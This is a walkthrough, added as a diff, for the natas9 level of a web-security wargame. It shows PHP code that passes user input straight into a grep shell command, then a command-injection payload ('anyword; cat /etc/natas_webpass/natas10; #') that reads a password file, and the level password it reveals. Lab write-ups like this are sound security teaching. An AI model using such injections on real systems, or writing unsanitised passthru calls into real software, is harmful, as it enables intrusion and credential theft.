@@ -1,0 +1,53 @@
+In natas9, we again have an input field and a chance to look at
+the source code. Let us first look at the code by clicking the link
+to viewing the source code. In the HTML body, we have the following:
+
+<form>
+Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
+</form>
+
+
+Output:
+<pre>
+<?
+$key = "";
+
+if(array_key_exists("needle", $_REQUEST)) {
+    $key = $_REQUEST["needle"];
+}
+
+if($key != "") {
+    passthru("grep -i $key dictionary.txt");
+}
+?>
+</pre>
+
+
+So, the PHP code executes a command according to our input, using the
+<grep> command. This seems like vulnerable to command injection. Let us
+try injecting a command into:
+
+<grep -i $key dictionary.txt>
+
+To do so, we should first end the <grep> part, insert the desired command,
+and comment out the remaining part. We can send the following key:
+
+anyword; cat /etc/natas_webpass/natas10; #
+
+So that the whole grep command becomes:
+
+grep -i anyword; cat /etc/natas_webpass/natas10; # dictionary.txt
+
+In this way, we can leak out the password. Thus, enter the following into
+the input form:
+
+anyword; cat /etc/natas_webpass/natas10; #
+
+Type search, and voila! The output is:
+
+nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
+
+So, the credentials are:
+
+Username: natas10
+Password: nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
